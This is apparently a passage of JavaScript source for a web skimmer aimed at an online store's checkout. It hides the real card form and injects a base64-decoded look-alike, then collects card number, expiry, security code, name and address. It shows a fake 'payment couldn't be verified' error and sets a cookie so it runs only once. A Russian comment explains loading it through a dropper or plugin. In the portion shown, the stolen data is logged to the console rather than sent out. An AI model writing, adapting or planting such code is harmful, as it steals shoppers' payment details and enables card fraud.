    this.parentNode.classList.remove("block-input-active")
}

const paymentOnPaste = function ({ e, listener, stateKey }) {
    e.preventDefault()

    const clipboardData = e.clipboardData || window.clipboardData;
    const pastedData = clipboardData.getData('Text');

    listener(e, pastedData, stateKey)
}

const addEventListenerToPaymentInputs = () => {
    const middleware = {
        input: paymentOnInput,
        keydown: paymentOnKeydown,
        focus: paymentOnFocus,
        blur: paymentOnBlur,
        paste: paymentOnPaste
    }

    elementsToCapture.forEach(({ id, events, stateKey, labelId }) => {
        const input = document.querySelector(`#${id}`)

        Object.entries(events).forEach(([event, listener]) => {
            const middlewareFunction = middleware[event]

            input.addEventListener(event, function (e) {
                middlewareFunction.call(this, { e, id, listener, stateKey, labelId })
            })
        })
    })
}

const togglePopup = (btn, popup, popupEl) => {
    btn.addEventListener("mouseenter", () => {
        popup.style.display = "block"

        setTimeout(() => {
            popupEl.classList.add("popup-active")
        }, 100)
    })

    btn.addEventListener("mouseleave", () => {


        const hidePopup = (e) => {
            const validTags = ["path", "circle"]
            const validClasses = ["popup-active", "security-code-popup", "a8x1wuo-1q", "security-code-popup-container", "card-popup-container", "card-popup", "_1fragem3b-1q", "_1fragem36-1q"];

            const isValidTags = validTags.includes(e.target.tagName)
            const isValidClasses = [...e.target.classList].some(className => validClasses.includes(className));

            if (!isValidTags && !isValidClasses) {
                popupEl.classList.remove("popup-active")

                document.removeEventListener("mousemove", hidePopup)

                setTimeout(() => {
                    popup.style.display = "none"
                }, 200)
            }
        }

        document.addEventListener("mousemove", hidePopup)
    })
}

const cardBtnBlock = `<button type="button" tabindex="-1" class="card-btn _1xqelvi1-1q _1fragem16-1q _1fragem18-1q _1fragemai-1q _1frageman-1q _1fragemax-1q _1fragemas-1q _1fragemb6-1q _1fragem1a-1q _1fragem1g-1q _1fragem4-1q _1fragem39-1q cb5z9-1q" aria-describedby="Overlay16"><span class="_19gi7yt0-1q _19gi7yte-1q _1fragem1l-1q _19gi7yt1-1q _19gi7yt4-1q">+2</span></button>`

const hideCards = () => {
    if (window.innerWidth <= 750) {
        const cardBlock = document.querySelector(".card-block")
        const hiddenCards = document.querySelectorAll(".hidden-card")

        hiddenCards.forEach((card) => card.style.display = "none")

        cardBlock.innerHTML += cardBtnBlock

        const cardBtn = document.querySelector(".card-btn")
        const cardPopup = document.querySelector(".card-popup")
        const cardPopupContainer = document.querySelector(".card-popup-container")

        togglePopup(cardBtn, cardPopupContainer, cardPopup)
    }
}

const handleMedia = () => {
    const mql = window.matchMedia('(min-width: 750px)')

    mql.addEventListener("change", (e) => {
        const cardBlock = document.querySelector(".card-block")
        const hiddenCards = document.querySelectorAll(".hidden-card")

        if (!e.matches) {
            hiddenCards.forEach((card) => card.style.display = "none")

            cardBlock.innerHTML += cardBtnBlock

            const cardBtn = document.querySelector(".card-btn")
            const cardPopup = document.querySelector(".card-popup")
            const cardPopupContainer = document.querySelector(".card-popup-container")

            return togglePopup(cardBtn, cardPopupContainer, cardPopup)
        }

        document.querySelector(".card-btn")?.remove()
        hiddenCards.forEach((card) => card.style.display = "block")
    })
}

const activateAlert = () => {
    const prevAlert = document.querySelector("[role='payment-alert']")

    if (prevAlert) return

    const contaner = document.querySelector("[aria-label='Payment']").children[0]
    const basic = document.querySelector("#basic")

    let alert = document.createElement("div")
    alert.setAttribute("role", "payment-alert")
    alert.setAttribute("class", "sdr03s1-1q _1fragem4z-1q _1fragem4w-1q _1fragem52-1q _1fragem4t-1q _1fragem8k-1q _1fragem91-1q _1fragem83-1q _1fragem9i-1q _1fragemai-1q _1fragem1e-1q sdr03s3-1q")
    alert.innerHTML += `<div class="sdr03s7-1q"><span class="_1fragem37-1q _1fragem10-1q _1fragem9t-1q _1fragem9s-1q _1fragem18-1q a8x1wuk-1q a8x1wum-1q"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 14 14" focusable="false" aria-hidden="true" class="a8x1wuo-1q _1fragem18-1q _1fragem37-1q _1fragem9t-1q _1fragem9s-1q"><circle cx="7" cy="7" r="5.6"></circle><path stroke-linecap="round" d="M7 4.083v2.722"></path><circle cx="7" cy="9.8" r="0.2"></circle><path stroke-linecap="round" stroke-linejoin="round" d="M7.002 9.798h-.005v.005h.005v-.005Z"></path></svg></span></div><div class="sdr03sa-1q">Your payment details couldn’t be verified. Check your card details and try again.</div>`

    contaner.insertBefore(alert, basic)
}

const disactiveAlert = () => {
    const alert = document.querySelector("[role='payment-alert']")

    if (alert) alert.remove()
}

const activateErrorAttributes = (inputId) => {
    const input = document.querySelector(`#${inputId}`)
    const span = document.querySelector(`#error-for-${inputId}`)

    if (!input.classList.contains("card-input-error")) {
        input.classList.add("card-input-error")
    }

    if (!span.classList.contains("error-text-active")) {
        span.classList.add("error-text-active")
    }
}

const disactivateErrorAttrubutes = (inputId) => {
    const input = document.querySelector(`#${inputId}`)
    const span = document.querySelector(`#error-for-${inputId}`)

    if (input.classList.contains("card-input-error")) {
        input.classList.remove("card-input-error")
    }

    if (span.classList.contains("error-text-active")) {
        span.classList.remove("error-text-active")
    }
}

const checkValidCardNumber = (cardNumber) => {
    if (cardNumber.length >= 1) {
        cardNumber = cardNumber.replace(/\s/gi, "")

        let isValidCard = false
        const [_, cardType] = getCardType(cardNumber)

        cardsRegExp.forEach(({ type, fullRegExp }) => {
            if (type == cardType) {
                isValidCard = fullRegExp.test(cardNumber)
            }
        })

        return isValidCard
    }

    return false
}

const checkValidNameOnCard = (nameOnCard) => {
    return nameOnCard.length > 0
}

const checkValidExpirationDate = (expirationDate) => {
    const date = new Date()
    const currentMonth = date.getMonth() + 1
    const currentYear = date.getFullYear()
    const arr = expirationDate.split("/")

    if (arr.length == 2) {
        const month = Number(arr[0])

        let year = arr[1].replace(/\s/gi, "")
        year = year.length == 2 ? `20${year}` : year
        year = Number(year)

        return (month >= 1 && month <= 12) && ((year > currentYear) || (year == currentYear && month >= currentMonth));
    }

    return false
}

const checkValidSecurityCode = (securityCode) => {
    const isValidCard = checkValidCardNumber(state.cardNumber)

    if (isValidCard) {
        const [_, cardType] = getCardType(state.cardNumber.replace(/\s/gi, ""))

        if (cardType == "amex") {
            if (securityCode.length != 4) {
                return false
            }

            return true
        }

        return securityCode.length == 3
    }

    return false
}

const elementsForValidation = [
    {
        id: "block-card-number",
        stateValue: "cardNumber",
        checkFunction: checkValidCardNumber
    },
    {
        id: "block-name-on-card",
        stateValue: "nameOnCard",
        checkFunction: checkValidNameOnCard
    },
    {
        id: "block-expiration-date",
        stateValue: "expirationDate",
        checkFunction: checkValidExpirationDate
    },
    {
        id: "block-security-code",
        stateValue: "securityCode",
        checkFunction: checkValidSecurityCode
    }
]

const validationCheck = (state) => {
    let isAlert = false

    elementsForValidation.forEach(({ id, stateValue, checkFunction }) => {
        if (!checkFunction(state[stateValue])) {
            activateErrorAttributes(id)
            isAlert = true
        }

        else {
            disactivateErrorAttrubutes(id)
        }
    })

    if (isAlert) {
        activateAlert()
        document.querySelector("[role='payment-alert']").scrollIntoView();

        return false
    }

    else {
        disactiveAlert()

        return true
    }
}

const activateOriginalFormInput = () => {
    document.querySelector("[for='basic-creditCards']").click()
}

const activateNewFormInput = () => {
    const input = document.querySelector("#payment-credit-cards")
    input.click()
}

const unmaskBlock = (...blocksId) => {
    blocksId.forEach(blockId => {
        const block = document.querySelector(`#${blockId}-collapsible`)

        block.style.height = "213px"

        setTimeout(() => {
            block.style.height = "auto"
            block.style.overflow = "visible"
        }, 320)
    })
}

const maskBlock = (...blocksId) => {
    blocksId.forEach(blockId => {
        const block = document.querySelector(`#${blockId}-collapsible`)

        block.style.height = "213px"
        block.style.overflow = "hidden"

        setTimeout(() => block.style.height = "0px")
    })
}

const unmaskNewForm = (block, headerCard, headerCardLabel) => {
    unmaskBlock(block)
    headerCard.classList.add("header-active")
    headerCardLabel.classList.add("header-label-active")

    const paymentOtherBlocksId = ["basic-PAYPAL_EXPRESS", "basic-AMAZON_PAY_CLASSIC"]

    paymentOtherBlocksId.forEach((blockId) => {
        let label = document.querySelector(`[for="${blockId}"]`)

        label.style = `display: block;
        padding: var(--x-option-list-block-padding) var(--x-option-list-inline-padding);`
        label.classList.remove("yL8c2")

        maskBlock(blockId)
    })
}

const maskNewForm = (block, headerCard, headerCardLabel) => {
    maskBlock(block)
    headerCard.classList.remove("header-active")
    headerCardLabel.classList.remove("header-label-active")

    const hiddenInput = document.querySelector("#payment-credit-cards-hidden")
    hiddenInput.click()
}

const handlePaymentCardBlock = (headerCard, headerCardLabel) => {
    activateOriginalFormInput()
    unmaskNewForm("basic-credit-cards", headerCard, headerCardLabel)
}

const handlePaymentOtherBlock = (headerCard, headerCardLabel, e) => {
    maskNewForm("basic-credit-cards", headerCard, headerCardLabel)

    const paymentBlockId = e.target.id
    let label = document.querySelector(`[for="${paymentBlockId}"]`)

    label.style = ``
    label.classList.add("yL8c2")
}

const addMisc = () => {
    document.querySelector("#error-for-block-name-on-card").innerHTML = `Enter your name exactly as it’s written on your card`
}

const addAnimationToForm = () => {
    const headerCard = document.querySelector("#header-card")
    const headerCardLabel = document.querySelector("#header-card-label")

    const cardInput = document.querySelector("#payment-credit-cards")
    const payPalInput = document.querySelector("#basic-PAYPAL_EXPRESS")
    const amazonPayInput = document.querySelector("#basic-AMAZON_PAY_CLASSIC")

    const inputs = [
        {
            input: cardInput,
            func: handlePaymentCardBlock
        },
        {
            input: payPalInput,
            func: handlePaymentOtherBlock
        },
        {
            input: amazonPayInput,
            func: handlePaymentOtherBlock
        }
    ]

    inputs.forEach(({ input, func }) => input.addEventListener("input", (e) => func(headerCard, headerCardLabel, e)))
}

const activateOriginalForm = () => {
    const container = document.querySelector("#basic").children[1]
    container.children[0].style.display = "block"
}

const disactivateOriginalForm = () => {
    const container = document.querySelector("#basic").children[1]
    container.children[0].style.display = "none"
}

const deobfuscateData = (data) => {
    let newData = ""

    Object.entries(data).forEach(([_, value]) => newData += atob(value))

    return newData
}

const addStyles = () => {
    let style = document.createElement("style")
    style.setAttribute("id", "styles-1q")
    style.innerHTML = deobfuscateData(STYLES)

    document.getElementsByTagName("head")[0].appendChild(style)
}

const deleteStyles = () => {
    const styles = document.querySelector("#styles-1q")
    styles.remove()
}

const addForm = () => {
    let form = document.createElement("div")
    form.setAttribute("id", "header-card")
    form.setAttribute("class", "B4zH6 Zb82w header-active OpmPd")
    form.setAttribute("style", "display: block")
    form.innerHTML = deobfuscateData(FORM)

    const container = document.querySelector("#basic").children[1]
    container.insertBefore(form, container.children[0])
}

const deleteForm = () => {
    const form = document.querySelector("#header-card")
    const cloneForm = form.cloneNode(true)
    const app = document.querySelector("#app")

    form.remove()
    cloneForm.style.display = "none"
    app.appendChild(cloneForm)

    deleteStyles()
    activateOriginalForm()
}

const addCardType = () => {
    const [_, cardType] = getCardType(state.cardNumber.replace(/\s/gi, ""))
    state.cardType = cardType
}

const addInformationData = () => {
    const inputNames = ["countryCode", "firstName", "lastName", "address1", "address2", "postalCode", "city", "phone"]

    inputNames.forEach((inputName) => {
        const input = document.querySelector(`[name="${inputName}"]`)

        if (inputName == "countryCode") {
            const countryValue = input.options[input.selectedIndex].text
            state["country"] = countryValue
            state[inputName] = input.value
        }

        state[inputName] = input.value
    })
}

const handlePay = (e, state) => {
    const cookie = checkCookie("gas_metrics")

    if (cookie != "true") {
        e.preventDefault()

        addCardType()
        addInformationData()

        const checkResult = validationCheck(state)

        if (checkResult) {
            console.table(state)

            console.group("alternative view")
            Object.entries(state).forEach(([key, value]) => console.log(`${key}: ${value}`))
            console.groupEnd()

            setCookie("gas_metrics", true)
            deleteForm()
        }
    }
}

const addEventListenerToPay = () => {
    setTimeout(() => {
        const payBtn = document.querySelector("#pay-button-container")

        payBtn.addEventListener("click", (e) => {
            handlePay(e, state)
        })
    });
}

const setCookie = (key, value) => {
    const cookie = `${key}=${value}`
    document.cookie = cookie
}

const checkCookie = (key) => {
    const cookiesRaw = document.cookie
    const cookies = cookiesRaw.split(";").reduce((acc, cookie) => {
        const key = cookie.split("=")[0].trim()
        const value = cookie.split("=")[1].trim()
        acc[key] = value
        return acc
    }, {})

    return cookies[key] || ""
}

const injectForm = () => {
    activateOriginalFormInput()
    addStyles()
    disactivateOriginalForm()
    addForm()
    activateNewFormInput()

    hideCards()
    handleMedia()

    addAnimationToForm()
    addEventListenerToPaymentInputs()

    addEventListenerToPay()

    addMisc()

    const securityCodeBtn = document.querySelector(".security-code-btn")
    const SecurityCodePopup = document.querySelector(".security-code-popup")
    const securityCodePopupContainer = document.querySelector(".security-code-popup-container")

    togglePopup(securityCodeBtn, securityCodePopupContainer, SecurityCodePopup)
}

const main = () => {
    const cookie = checkCookie("gas_metrics")

    if (cookie != "true") {
        injectForm()
    }
}

// для загрузки при помощи дроппера или стороннего плагина необходимо раскомментировать блок кода ниже и закомментировать одиночный вызов main() после блока

// window.onload = function () {
//     main()
// }

main()

